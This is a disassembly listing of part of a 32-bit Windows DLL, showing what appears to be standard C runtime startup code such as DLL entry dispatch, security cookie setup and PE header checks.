10001d6a:	75 29                	jne    0x10001d95
10001d6c:	e8 3f 05 00 00       	call   0x100022b0
10001d71:	84 c0                	test   %al,%al
10001d73:	74 20                	je     0x10001d95
10001d75:	68 64 d1 00 10       	push   $0x1000d164
10001d7a:	68 60 d1 00 10       	push   $0x1000d160
10001d7f:	e8 56 27 00 00       	call   0x100044da
10001d84:	59                   	pop    %ecx
10001d85:	59                   	pop    %ecx
10001d86:	c7 05 40 40 01 10 02 	movl   $0x2,0x10014040
10001d8d:	00 00 00 
10001d90:	32 db                	xor    %bl,%bl
10001d92:	88 5d e7             	mov    %bl,-0x19(%ebp)
10001d95:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
10001d9c:	e8 3d 00 00 00       	call   0x10001dde
10001da1:	84 db                	test   %bl,%bl
10001da3:	75 43                	jne    0x10001de8
10001da5:	e8 68 07 00 00       	call   0x10002512
10001daa:	8b f0                	mov    %eax,%esi
10001dac:	83 3e 00             	cmpl   $0x0,(%esi)
10001daf:	74 1f                	je     0x10001dd0
10001db1:	56                   	push   %esi
10001db2:	e8 82 06 00 00       	call   0x10002439
10001db7:	59                   	pop    %ecx
10001db8:	84 c0                	test   %al,%al
10001dba:	74 14                	je     0x10001dd0
10001dbc:	ff 75 0c             	push   0xc(%ebp)
10001dbf:	6a 02                	push   $0x2
10001dc1:	ff 75 08             	push   0x8(%ebp)
10001dc4:	8b 36                	mov    (%esi),%esi
10001dc6:	8b ce                	mov    %esi,%ecx
10001dc8:	ff 15 5c d1 00 10    	call   *0x1000d15c
10001dce:	ff d6                	call   *%esi
10001dd0:	ff 05 08 3d 01 10    	incl   0x10013d08
10001dd6:	33 c0                	xor    %eax,%eax
10001dd8:	40                   	inc    %eax
10001dd9:	eb 0f                	jmp    0x10001dea
10001ddb:	8a 5d e7             	mov    -0x19(%ebp),%bl
10001dde:	ff 75 e3             	push   -0x1d(%ebp)
10001de1:	e8 e7 06 00 00       	call   0x100024cd
10001de6:	59                   	pop    %ecx
10001de7:	c3                   	ret
10001de8:	33 c0                	xor    %eax,%eax
10001dea:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10001ded:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10001df4:	59                   	pop    %ecx
10001df5:	5f                   	pop    %edi
10001df6:	5e                   	pop    %esi
10001df7:	5b                   	pop    %ebx
10001df8:	c9                   	leave
10001df9:	c3                   	ret
10001dfa:	6a 07                	push   $0x7
10001dfc:	e8 17 07 00 00       	call   0x10002518
10001e01:	cc                   	int3
10001e02:	6a 10                	push   $0x10
10001e04:	68 60 22 01 10       	push   $0x10012260
10001e09:	e8 92 08 00 00       	call   0x100026a0
10001e0e:	a1 08 3d 01 10       	mov    0x10013d08,%eax
10001e13:	85 c0                	test   %eax,%eax
10001e15:	7f 04                	jg     0x10001e1b
10001e17:	33 c0                	xor    %eax,%eax
10001e19:	eb 69                	jmp    0x10001e84
10001e1b:	48                   	dec    %eax
10001e1c:	a3 08 3d 01 10       	mov    %eax,0x10013d08
10001e21:	33 ff                	xor    %edi,%edi
10001e23:	47                   	inc    %edi
10001e24:	89 7d e4             	mov    %edi,-0x1c(%ebp)
10001e27:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10001e2b:	e8 4e 04 00 00       	call   0x1000227e
10001e30:	88 45 e0             	mov    %al,-0x20(%ebp)
10001e33:	89 7d fc             	mov    %edi,-0x4(%ebp)
10001e36:	83 3d 40 40 01 10 02 	cmpl   $0x2,0x10014040
10001e3d:	75 6b                	jne    0x10001eaa
10001e3f:	e8 05 05 00 00       	call   0x10002349
10001e44:	e8 c2 03 00 00       	call   0x1000220b
10001e49:	e8 18 08 00 00       	call   0x10002666
10001e4e:	83 25 40 40 01 10 00 	andl   $0x0,0x10014040
10001e55:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10001e59:	e8 39 00 00 00       	call   0x10001e97
10001e5e:	6a 00                	push   $0x0
10001e60:	ff 75 08             	push   0x8(%ebp)
10001e63:	e8 82 06 00 00       	call   0x100024ea
10001e68:	59                   	pop    %ecx
10001e69:	59                   	pop    %ecx
10001e6a:	0f b6 f0             	movzbl %al,%esi
10001e6d:	f7 de                	neg    %esi
10001e6f:	1b f6                	sbb    %esi,%esi
10001e71:	23 f7                	and    %edi,%esi
10001e73:	89 75 e4             	mov    %esi,-0x1c(%ebp)
10001e76:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
10001e7d:	e8 22 00 00 00       	call   0x10001ea4
10001e82:	8b c6                	mov    %esi,%eax
10001e84:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10001e87:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10001e8e:	59                   	pop    %ecx
10001e8f:	5f                   	pop    %edi
10001e90:	5e                   	pop    %esi
10001e91:	5b                   	pop    %ebx
10001e92:	c9                   	leave
10001e93:	c3                   	ret
10001e94:	8b 7d e4             	mov    -0x1c(%ebp),%edi
10001e97:	ff 75 e0             	push   -0x20(%ebp)
10001e9a:	e8 2e 06 00 00       	call   0x100024cd
10001e9f:	59                   	pop    %ecx
10001ea0:	c3                   	ret
10001ea1:	8b 75 e4             	mov    -0x1c(%ebp),%esi
10001ea4:	e8 c3 04 00 00       	call   0x1000236c
10001ea9:	c3                   	ret
10001eaa:	6a 07                	push   $0x7
10001eac:	e8 67 06 00 00       	call   0x10002518
10001eb1:	cc                   	int3
10001eb2:	6a 0c                	push   $0xc
10001eb4:	68 88 22 01 10       	push   $0x10012288
10001eb9:	e8 e2 07 00 00       	call   0x100026a0
10001ebe:	8b 7d 0c             	mov    0xc(%ebp),%edi
10001ec1:	85 ff                	test   %edi,%edi
10001ec3:	75 0f                	jne    0x10001ed4
10001ec5:	39 3d 08 3d 01 10    	cmp    %edi,0x10013d08
10001ecb:	7f 07                	jg     0x10001ed4
10001ecd:	33 c0                	xor    %eax,%eax
10001ecf:	e9 d9 00 00 00       	jmp    0x10001fad
10001ed4:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10001ed8:	83 ff 01             	cmp    $0x1,%edi
10001edb:	74 0a                	je     0x10001ee7
10001edd:	83 ff 02             	cmp    $0x2,%edi
10001ee0:	74 05                	je     0x10001ee7
10001ee2:	8b 5d 10             	mov    0x10(%ebp),%ebx
10001ee5:	eb 31                	jmp    0x10001f18
10001ee7:	8b 5d 10             	mov    0x10(%ebp),%ebx
10001eea:	53                   	push   %ebx
10001eeb:	57                   	push   %edi
10001eec:	ff 75 08             	push   0x8(%ebp)
10001eef:	e8 c9 00 00 00       	call   0x10001fbd
10001ef4:	8b f0                	mov    %eax,%esi
10001ef6:	89 75 e4             	mov    %esi,-0x1c(%ebp)
10001ef9:	85 f6                	test   %esi,%esi
10001efb:	0f 84 a3 00 00 00    	je     0x10001fa4
10001f01:	53                   	push   %ebx
10001f02:	57                   	push   %edi
10001f03:	ff 75 08             	push   0x8(%ebp)
10001f06:	e8 9d fd ff ff       	call   0x10001ca8
10001f0b:	8b f0                	mov    %eax,%esi
10001f0d:	89 75 e4             	mov    %esi,-0x1c(%ebp)
10001f10:	85 f6                	test   %esi,%esi
10001f12:	0f 84 8c 00 00 00    	je     0x10001fa4
10001f18:	53                   	push   %ebx
10001f19:	57                   	push   %edi
10001f1a:	ff 75 08             	push   0x8(%ebp)
10001f1d:	e8 d7 02 00 00       	call   0x100021f9
10001f22:	8b f0                	mov    %eax,%esi
10001f24:	89 75 e4             	mov    %esi,-0x1c(%ebp)
10001f27:	83 ff 01             	cmp    $0x1,%edi
10001f2a:	75 27                	jne    0x10001f53
10001f2c:	85 f6                	test   %esi,%esi
10001f2e:	75 23                	jne    0x10001f53
10001f30:	53                   	push   %ebx
10001f31:	50                   	push   %eax
10001f32:	ff 75 08             	push   0x8(%ebp)
10001f35:	e8 bf 02 00 00       	call   0x100021f9
10001f3a:	85 db                	test   %ebx,%ebx
10001f3c:	0f 95 c0             	setne  %al
10001f3f:	0f b6 c0             	movzbl %al,%eax
10001f42:	50                   	push   %eax
10001f43:	e8 ba fe ff ff       	call   0x10001e02
10001f48:	59                   	pop    %ecx
10001f49:	53                   	push   %ebx
10001f4a:	56                   	push   %esi
10001f4b:	ff 75 08             	push   0x8(%ebp)
10001f4e:	e8 6a 00 00 00       	call   0x10001fbd
10001f53:	85 ff                	test   %edi,%edi
10001f55:	74 05                	je     0x10001f5c
10001f57:	83 ff 03             	cmp    $0x3,%edi
10001f5a:	75 48                	jne    0x10001fa4
10001f5c:	53                   	push   %ebx
10001f5d:	57                   	push   %edi
10001f5e:	ff 75 08             	push   0x8(%ebp)
10001f61:	e8 42 fd ff ff       	call   0x10001ca8
10001f66:	8b f0                	mov    %eax,%esi
10001f68:	89 75 e4             	mov    %esi,-0x1c(%ebp)
10001f6b:	85 f6                	test   %esi,%esi
10001f6d:	74 35                	je     0x10001fa4
10001f6f:	53                   	push   %ebx
10001f70:	57                   	push   %edi
10001f71:	ff 75 08             	push   0x8(%ebp)
10001f74:	e8 44 00 00 00       	call   0x10001fbd
10001f79:	8b f0                	mov    %eax,%esi
10001f7b:	eb 24                	jmp    0x10001fa1
10001f7d:	8b 4d ec             	mov    -0x14(%ebp),%ecx
10001f80:	8b 01                	mov    (%ecx),%eax
10001f82:	51                   	push   %ecx
10001f83:	ff 30                	push   (%eax)
10001f85:	68 a8 1c 00 10       	push   $0x10001ca8
10001f8a:	ff 75 10             	push   0x10(%ebp)
10001f8d:	ff 75 0c             	push   0xc(%ebp)
10001f90:	ff 75 08             	push   0x8(%ebp)
10001f93:	e8 7d 03 00 00       	call   0x10002315
10001f98:	83 c4 18             	add    $0x18,%esp
10001f9b:	c3                   	ret
10001f9c:	8b 65 e8             	mov    -0x18(%ebp),%esp
10001f9f:	33 f6                	xor    %esi,%esi
10001fa1:	89 75 e4             	mov    %esi,-0x1c(%ebp)
10001fa4:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
10001fab:	8b c6                	mov    %esi,%eax
10001fad:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10001fb0:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10001fb7:	59                   	pop    %ecx
10001fb8:	5f                   	pop    %edi
10001fb9:	5e                   	pop    %esi
10001fba:	5b                   	pop    %ebx
10001fbb:	c9                   	leave
10001fbc:	c3                   	ret
10001fbd:	55                   	push   %ebp
10001fbe:	8b ec                	mov    %esp,%ebp
10001fc0:	56                   	push   %esi
10001fc1:	8b 35 a0 d1 00 10    	mov    0x1000d1a0,%esi
10001fc7:	85 f6                	test   %esi,%esi
10001fc9:	75 05                	jne    0x10001fd0
10001fcb:	33 c0                	xor    %eax,%eax
10001fcd:	40                   	inc    %eax
10001fce:	eb 13                	jmp    0x10001fe3
10001fd0:	ff 75 10             	push   0x10(%ebp)
10001fd3:	8b ce                	mov    %esi,%ecx
10001fd5:	ff 75 0c             	push   0xc(%ebp)
10001fd8:	ff 75 08             	push   0x8(%ebp)
10001fdb:	ff 15 5c d1 00 10    	call   *0x1000d15c
10001fe1:	ff d6                	call   *%esi
10001fe3:	5e                   	pop    %esi
10001fe4:	5d                   	pop    %ebp
10001fe5:	c2 0c 00             	ret    $0xc
10001fe8:	e9 db 74 00 00       	jmp    0x100094c8
10001fed:	0c 01                	or     $0x1,%al
10001fef:	75 05                	jne    0x10001ff6
10001ff1:	e8 b8 01 00 00       	call   0x100021ae
10001ff6:	ff 75 10             	push   0x10(%ebp)
10001ff9:	ff 75 0c             	push   0xc(%ebp)
10001ffc:	ff 75 08             	push   0x8(%ebp)
10001fff:	e8 ae fe ff ff       	call   0x10001eb2
10002004:	83 c4 0c             	add    $0xc,%esp
10002007:	5d                   	pop    %ebp
10002008:	c2 0c 00             	ret    $0xc
1000200b:	55                   	push   %ebp
1000200c:	8b ec                	mov    %esp,%ebp
1000200e:	6a 00                	push   $0x0
10002010:	ff 15 58 d0 00 10    	call   *0x1000d058
10002016:	ff 75 08             	push   0x8(%ebp)
10002019:	ff 15 54 d0 00 10    	call   *0x1000d054
1000201f:	68 09 04 00 c0       	push   $0xc0000409
10002024:	ff 15 5c d0 00 10    	call   *0x1000d05c
1000202a:	50                   	push   %eax
1000202b:	ff 15 60 d0 00 10    	call   *0x1000d060
10002031:	5d                   	pop    %ebp
10002032:	c3                   	ret
10002033:	55                   	push   %ebp
10002034:	8b ec                	mov    %esp,%ebp
10002036:	81 ec 24 03 00 00    	sub    $0x324,%esp
1000203c:	6a 17                	push   $0x17
1000203e:	e8 e0 09 00 00       	call   0x10002a23
10002043:	85 c0                	test   %eax,%eax
10002045:	74 05                	je     0x1000204c
10002047:	6a 02                	push   $0x2
10002049:	59                   	pop    %ecx
1000204a:	cd 29                	int    $0x29
1000204c:	a3 10 3e 01 10       	mov    %eax,0x10013e10
10002051:	89 0d 0c 3e 01 10    	mov    %ecx,0x10013e0c
10002057:	89 15 08 3e 01 10    	mov    %edx,0x10013e08
1000205d:	89 1d 04 3e 01 10    	mov    %ebx,0x10013e04
10002063:	89 35 00 3e 01 10    	mov    %esi,0x10013e00
10002069:	89 3d fc 3d 01 10    	mov    %edi,0x10013dfc
1000206f:	66 8c 15 28 3e 01 10 	data16 mov %ss,0x10013e28
10002076:	66 8c 0d 1c 3e 01 10 	data16 mov %cs,0x10013e1c
1000207d:	66 8c 1d f8 3d 01 10 	data16 mov %ds,0x10013df8
10002084:	66 8c 05 f4 3d 01 10 	data16 mov %es,0x10013df4
1000208b:	66 8c 25 f0 3d 01 10 	data16 mov %fs,0x10013df0
10002092:	66 8c 2d ec 3d 01 10 	data16 mov %gs,0x10013dec
10002099:	9c                   	pushf
1000209a:	8f 05 20 3e 01 10    	pop    0x10013e20
100020a0:	8b 45 00             	mov    0x0(%ebp),%eax
100020a3:	a3 14 3e 01 10       	mov    %eax,0x10013e14
100020a8:	8b 45 04             	mov    0x4(%ebp),%eax
100020ab:	a3 18 3e 01 10       	mov    %eax,0x10013e18
100020b0:	8d 45 08             	lea    0x8(%ebp),%eax
100020b3:	a3 24 3e 01 10       	mov    %eax,0x10013e24
100020b8:	8b 85 dc fc ff ff    	mov    -0x324(%ebp),%eax
100020be:	c7 05 60 3d 01 10 01 	movl   $0x10001,0x10013d60
100020c5:	00 01 00 
100020c8:	a1 18 3e 01 10       	mov    0x10013e18,%eax
100020cd:	a3 1c 3d 01 10       	mov    %eax,0x10013d1c
100020d2:	c7 05 10 3d 01 10 09 	movl   $0xc0000409,0x10013d10
100020d9:	04 00 c0 
100020dc:	c7 05 14 3d 01 10 01 	movl   $0x1,0x10013d14
100020e3:	00 00 00 
100020e6:	c7 05 20 3d 01 10 01 	movl   $0x1,0x10013d20
100020ed:	00 00 00 
100020f0:	6a 04                	push   $0x4
100020f2:	58                   	pop    %eax
100020f3:	6b c0 00             	imul   $0x0,%eax,%eax
100020f6:	c7 80 24 3d 01 10 02 	movl   $0x2,0x10013d24(%eax)
100020fd:	00 00 00 
10002100:	6a 04                	push   $0x4
10002102:	58                   	pop    %eax
10002103:	6b c0 00             	imul   $0x0,%eax,%eax
10002106:	8b 0d 04 30 01 10    	mov    0x10013004,%ecx
1000210c:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
10002110:	6a 04                	push   $0x4
10002112:	58                   	pop    %eax
10002113:	c1 e0 00             	shl    $0x0,%eax
10002116:	8b 0d 00 30 01 10    	mov    0x10013000,%ecx
1000211c:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
10002120:	68 a4 d1 00 10       	push   $0x1000d1a4
10002125:	e8 e1 fe ff ff       	call   0x1000200b
1000212a:	c9                   	leave
1000212b:	c3                   	ret
1000212c:	e9 83 23 00 00       	jmp    0x100044b4
10002131:	55                   	push   %ebp
10002132:	8b ec                	mov    %esp,%ebp
10002134:	eb 0d                	jmp    0x10002143
10002136:	ff 75 08             	push   0x8(%ebp)
10002139:	e8 1e 24 00 00       	call   0x1000455c
1000213e:	59                   	pop    %ecx
1000213f:	85 c0                	test   %eax,%eax
10002141:	74 0f                	je     0x10002152
10002143:	ff 75 08             	push   0x8(%ebp)
10002146:	e8 84 23 00 00       	call   0x100044cf
1000214b:	59                   	pop    %ecx
1000214c:	85 c0                	test   %eax,%eax
1000214e:	74 e6                	je     0x10002136
10002150:	5d                   	pop    %ebp
10002151:	c3                   	ret
10002152:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
10002156:	0f 84 8c 06 00 00    	je     0x100027e8
1000215c:	e9 6a 06 00 00       	jmp    0x100027cb
10002161:	55                   	push   %ebp
10002162:	8b ec                	mov    %esp,%ebp
10002164:	83 ec 14             	sub    $0x14,%esp
10002167:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
1000216b:	8d 45 f4             	lea    -0xc(%ebp),%eax
1000216e:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
10002172:	50                   	push   %eax
10002173:	ff 15 74 d0 00 10    	call   *0x1000d074
10002179:	8b 45 f8             	mov    -0x8(%ebp),%eax
1000217c:	33 45 f4             	xor    -0xc(%ebp),%eax
1000217f:	89 45 fc             	mov    %eax,-0x4(%ebp)
10002182:	ff 15 70 d0 00 10    	call   *0x1000d070
10002188:	31 45 fc             	xor    %eax,-0x4(%ebp)
1000218b:	ff 15 6c d0 00 10    	call   *0x1000d06c
10002191:	31 45 fc             	xor    %eax,-0x4(%ebp)
10002194:	8d 45 ec             	lea    -0x14(%ebp),%eax
10002197:	50                   	push   %eax
10002198:	ff 15 68 d0 00 10    	call   *0x1000d068
1000219e:	8b 45 f0             	mov    -0x10(%ebp),%eax
100021a1:	8d 4d fc             	lea    -0x4(%ebp),%ecx
100021a4:	33 45 ec             	xor    -0x14(%ebp),%eax
100021a7:	33 45 fc             	xor    -0x4(%ebp),%eax
100021aa:	33 c1                	xor    %ecx,%eax
100021ac:	c9                   	leave
100021ad:	c3                   	ret
100021ae:	8b 0d 04 30 01 10    	mov    0x10013004,%ecx
100021b4:	56                   	push   %esi
100021b5:	57                   	push   %edi
100021b6:	bf 4e e6 40 bb       	mov    $0xbb40e64e,%edi
100021bb:	be 00 00 ff ff       	mov    $0xffff0000,%esi
100021c0:	3b cf                	cmp    %edi,%ecx
100021c2:	74 04                	je     0x100021c8
100021c4:	85 ce                	test   %ecx,%esi
100021c6:	75 26                	jne    0x100021ee
100021c8:	e8 94 ff ff ff       	call   0x10002161
100021cd:	8b c8                	mov    %eax,%ecx
100021cf:	3b cf                	cmp    %edi,%ecx
100021d1:	75 07                	jne    0x100021da
100021d3:	b9 4f e6 40 bb       	mov    $0xbb40e64f,%ecx
100021d8:	eb 0e                	jmp    0x100021e8
100021da:	85 ce                	test   %ecx,%esi
100021dc:	75 0a                	jne    0x100021e8
100021de:	0d 11 47 00 00       	or     $0x4711,%eax
100021e3:	c1 e0 10             	shl    $0x10,%eax
100021e6:	0b c8                	or     %eax,%ecx
100021e8:	89 0d 04 30 01 10    	mov    %ecx,0x10013004
100021ee:	f7 d1                	not    %ecx
100021f0:	5f                   	pop    %edi
100021f1:	89 0d 00 30 01 10    	mov    %ecx,0x10013000
100021f7:	5e                   	pop    %esi
100021f8:	c3                   	ret
100021f9:	33 c0                	xor    %eax,%eax
100021fb:	40                   	inc    %eax
100021fc:	c2 0c 00             	ret    $0xc
100021ff:	68 30 40 01 10       	push   $0x10014030
10002204:	ff 15 78 d0 00 10    	call   *0x1000d078
1000220a:	c3                   	ret
1000220b:	68 30 40 01 10       	push   $0x10014030
10002210:	e8 b9 09 00 00       	call   0x10002bce
10002215:	59                   	pop    %ecx
10002216:	c3                   	ret
10002217:	b8 38 40 01 10       	mov    $0x10014038,%eax
1000221c:	c3                   	ret
1000221d:	e8 de ed ff ff       	call   0x10001000
10002222:	8b 48 04             	mov    0x4(%eax),%ecx
10002225:	83 08 24             	orl    $0x24,(%eax)
10002228:	89 48 04             	mov    %ecx,0x4(%eax)
1000222b:	e8 e7 ff ff ff       	call   0x10002217
10002230:	8b 48 04             	mov    0x4(%eax),%ecx
10002233:	83 08 02             	orl    $0x2,(%eax)
10002236:	89 48 04             	mov    %ecx,0x4(%eax)
10002239:	c3                   	ret
1000223a:	55                   	push   %ebp
1000223b:	8b ec                	mov    %esp,%ebp
1000223d:	8b 45 08             	mov    0x8(%ebp),%eax
10002240:	56                   	push   %esi
10002241:	8b 48 3c             	mov    0x3c(%eax),%ecx
10002244:	03 c8                	add    %eax,%ecx
10002246:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
1000224a:	8d 51 18             	lea    0x18(%ecx),%edx
1000224d:	03 d0                	add    %eax,%edx
1000224f:	0f b7 41 06          	movzwl 0x6(%ecx),%eax
10002253:	6b f0 28             	imul   $0x28,%eax,%esi
10002256:	03 f2                	add    %edx,%esi
10002258:	3b d6                	cmp    %esi,%edx
1000225a:	74 19                	je     0x10002275
1000225c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000225f:	3b 4a 0c             	cmp    0xc(%edx),%ecx
10002262:	72 0a                	jb     0x1000226e
10002264:	8b 42 08             	mov    0x8(%edx),%eax
10002267:	03 42 0c             	add    0xc(%edx),%eax
1000226a:	3b c8                	cmp    %eax,%ecx
1000226c:	72 0c                	jb     0x1000227a
1000226e:	83 c2 28             	add    $0x28,%edx
10002271:	3b d6                	cmp    %esi,%edx
10002273:	75 ea                	jne    0x1000225f
10002275:	33 c0                	xor    %eax,%eax
10002277:	5e                   	pop    %esi
10002278:	5d                   	pop    %ebp
10002279:	c3                   	ret
1000227a:	8b c2                	mov    %edx,%eax
1000227c:	eb f9                	jmp    0x10002277
1000227e:	56                   	push   %esi
1000227f:	e8 62 07 00 00       	call   0x100029e6
10002284:	85 c0                	test   %eax,%eax
10002286:	74 20                	je     0x100022a8
10002288:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
1000228e:	be 44 40 01 10       	mov    $0x10014044,%esi
10002293:	8b 50 04             	mov    0x4(%eax),%edx
10002296:	eb 04                	jmp    0x1000229c
10002298:	3b d0                	cmp    %eax,%edx
1000229a:	74 10                	je     0x100022ac
1000229c:	33 c0                	xor    %eax,%eax
1000229e:	8b ca                	mov    %edx,%ecx
100022a0:	f0 0f b1 0e          	lock cmpxchg %ecx,(%esi)
100022a4:	85 c0                	test   %eax,%eax
100022a6:	75 f0                	jne    0x10002298
100022a8:	32 c0                	xor    %al,%al
100022aa:	5e                   	pop    %esi
100022ab:	c3                   	ret
100022ac:	b0 01                	mov    $0x1,%al
100022ae:	5e                   	pop    %esi
100022af:	c3                   	ret
100022b0:	e8 31 07 00 00       	call   0x100029e6
100022b5:	85 c0                	test   %eax,%eax
100022b7:	74 07                	je     0x100022c0
100022b9:	e8 54 05 00 00       	call   0x10002812
100022be:	eb 18                	jmp    0x100022d8
100022c0:	e8 1d 07 00 00       	call   0x100029e2
100022c5:	50                   	push   %eax
100022c6:	e8 3f 2a 00 00       	call   0x10004d0a
100022cb:	59                   	pop    %ecx
100022cc:	85 c0                	test   %eax,%eax
100022ce:	74 03                	je     0x100022d3
100022d0:	32 c0                	xor    %al,%al
100022d2:	c3                   	ret
100022d3:	e8 25 2c 00 00       	call   0x10004efd
100022d8:	b0 01                	mov    $0x1,%al
100022da:	c3                   	ret
100022db:	6a 00                	push   $0x0
100022dd:	e8 d0 00 00 00       	call   0x100023b2
100022e2:	84 c0                	test   %al,%al
100022e4:	59                   	pop    %ecx
100022e5:	0f 95 c0             	setne  %al
100022e8:	c3                   	ret
100022e9:	e8 22 09 00 00       	call   0x10002c10
100022ee:	84 c0                	test   %al,%al
100022f0:	75 03                	jne    0x100022f5
100022f2:	32 c0                	xor    %al,%al
100022f4:	c3                   	ret
100022f5:	e8 c2 2e 00 00       	call   0x100051bc
100022fa:	84 c0                	test   %al,%al
100022fc:	75 07                	jne    0x10002305
100022fe:	e8 18 09 00 00       	call   0x10002c1b
10002303:	eb ed                	jmp    0x100022f2
10002305:	b0 01                	mov    $0x1,%al
10002307:	c3                   	ret
10002308:	e8 ba 2e 00 00       	call   0x100051c7
1000230d:	e8 09 09 00 00       	call   0x10002c1b
10002312:	b0 01                	mov    $0x1,%al
10002314:	c3                   	ret
10002315:	55                   	push   %ebp
10002316:	8b ec                	mov    %esp,%ebp
10002318:	e8 c9 06 00 00       	call   0x100029e6
1000231d:	85 c0                	test   %eax,%eax
1000231f:	75 19                	jne    0x1000233a
10002321:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
10002325:	75 13                	jne    0x1000233a
10002327:	ff 75 10             	push   0x10(%ebp)
1000232a:	8b 4d 14             	mov    0x14(%ebp),%ecx
1000232d:	50                   	push   %eax
1000232e:	ff 75 08             	push   0x8(%ebp)
10002331:	ff 15 5c d1 00 10    	call   *0x1000d15c
10002337:	ff 55 14             	call   *0x14(%ebp)
1000233a:	ff 75 1c             	push   0x1c(%ebp)
1000233d:	ff 75 18             	push   0x18(%ebp)
10002340:	e8 a0 22 00 00       	call   0x100045e5
10002345:	59                   	pop    %ecx
10002346:	59                   	pop    %ecx
10002347:	5d                   	pop    %ebp
10002348:	c3                   	ret
10002349:	e8 98 06 00 00       	call   0x100029e6
1000234e:	85 c0                	test   %eax,%eax
10002350:	74 0c                	je     0x1000235e
10002352:	68 4c 40 01 10       	push   $0x1001404c
10002357:	e8 db 2c 00 00       	call   0x10005037
1000235c:	59                   	pop    %ecx
1000235d:	c3                   	ret
1000235e:	e8 a4 26 00 00       	call   0x10004a07
10002363:	85 c0                	test   %eax,%eax
10002365:	0f 84 77 26 00 00    	je     0x100049e2
1000236b:	c3                   	ret
1000236c:	6a 00                	push   $0x0
1000236e:	e8 8c 2e 00 00       	call   0x100051ff
10002373:	59                   	pop    %ecx
10002374:	e9 c4 08 00 00       	jmp    0x10002c3d
10002379:	55                   	push   %ebp
1000237a:	8b ec                	mov    %esp,%ebp
1000237c:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
10002380:	75 07                	jne    0x10002389
10002382:	c6 05 48 40 01 10 01 	movb   $0x1,0x10014048
10002389:	e8 84 04 00 00       	call   0x10002812
1000238e:	e8 5e 08 00 00       	call   0x10002bf1
10002393:	84 c0                	test   %al,%al
10002395:	75 04                	jne    0x1000239b
10002397:	32 c0                	xor    %al,%al
10002399:	5d                   	pop    %ebp
1000239a:	c3                   	ret
1000239b:	e8 0a 2e 00 00       	call   0x100051aa
100023a0:	84 c0                	test   %al,%al
100023a2:	75 0a                	jne    0x100023ae
100023a4:	6a 00                	push   $0x0
100023a6:	e8 7b 08 00 00       	call   0x10002c26
100023ab:	59                   	pop    %ecx
100023ac:	eb e9                	jmp    0x10002397
100023ae:	b0 01                	mov    $0x1,%al
100023b0:	5d                   	pop    %ebp
100023b1:	c3                   	ret
100023b2:	55                   	push   %ebp
100023b3:	8b ec                	mov    %esp,%ebp
100023b5:	80 3d 49 40 01 10 00 	cmpb   $0x0,0x10014049
100023bc:	74 04                	je     0x100023c2
100023be:	b0 01                	mov    $0x1,%al
100023c0:	5d                   	pop    %ebp
100023c1:	c3                   	ret
100023c2:	56                   	push   %esi
100023c3:	8b 75 08             	mov    0x8(%ebp),%esi
100023c6:	85 f6                	test   %esi,%esi
100023c8:	74 05                	je     0x100023cf
100023ca:	83 fe 01             	cmp    $0x1,%esi
100023cd:	75 62                	jne    0x10002431
100023cf:	e8 12 06 00 00       	call   0x100029e6
100023d4:	85 c0                	test   %eax,%eax
100023d6:	74 26                	je     0x100023fe
100023d8:	85 f6                	test   %esi,%esi
100023da:	75 22                	jne    0x100023fe
100023dc:	68 4c 40 01 10       	push   $0x1001404c
100023e1:	e8 7e 2c 00 00       	call   0x10005064
100023e6:	59                   	pop    %ecx
100023e7:	85 c0                	test   %eax,%eax
100023e9:	75 0f                	jne    0x100023fa
100023eb:	68 58 40 01 10       	push   $0x10014058
100023f0:	e8 6f 2c 00 00       	call   0x10005064
100023f5:	59                   	pop    %ecx
100023f6:	85 c0                	test   %eax,%eax
100023f8:	74 2b                	je     0x10002425
100023fa:	32 c0                	xor    %al,%al
100023fc:	eb 30                	jmp    0x1000242e
100023fe:	83 c9 ff             	or     $0xffffffff,%ecx
10002401:	89 0d 4c 40 01 10    	mov    %ecx,0x1001404c
10002407:	89 0d 50 40 01 10    	mov    %ecx,0x10014050
1000240d:	89 0d 54 40 01 10    	mov    %ecx,0x10014054
10002413:	89 0d 58 40 01 10    	mov    %ecx,0x10014058
10002419:	89 0d 5c 40 01 10    	mov    %ecx,0x1001405c
1000241f:	89 0d 60 40 01 10    	mov    %ecx,0x10014060
10002425:	c6 05 49 40 01 10 01 	movb   $0x1,0x10014049
1000242c:	b0 01                	mov    $0x1,%al
1000242e:	5e                   	pop    %esi
1000242f:	5d                   	pop    %ebp
10002430:	c3                   	ret
10002431:	6a 05                	push   $0x5
10002433:	e8 e0 00 00 00       	call   0x10002518
10002438:	cc                   	int3
10002439:	6a 08                	push   $0x8
1000243b:	68 a8 22 01 10       	push   $0x100122a8
10002440:	e8 5b 02 00 00       	call   0x100026a0
10002445:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10002449:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
1000244e:	66 39 05 00 00 00 10 	cmp    %ax,0x10000000
10002455:	75 5d                	jne    0x100024b4
10002457:	a1 3c 00 00 10       	mov    0x1000003c,%eax
1000245c:	81 b8 00 00 00 10 50 	cmpl   $0x4550,0x10000000(%eax)
10002463:	45 00 00 
10002466:	75 4c                	jne    0x100024b4
10002468:	b9 0b 01 00 00       	mov    $0x10b,%ecx
1000246d:	66 39 88 18 00 00 10 	cmp    %cx,0x10000018(%eax)
10002474:	75 3e                	jne    0x100024b4
10002476:	8b 45 08             	mov    0x8(%ebp),%eax
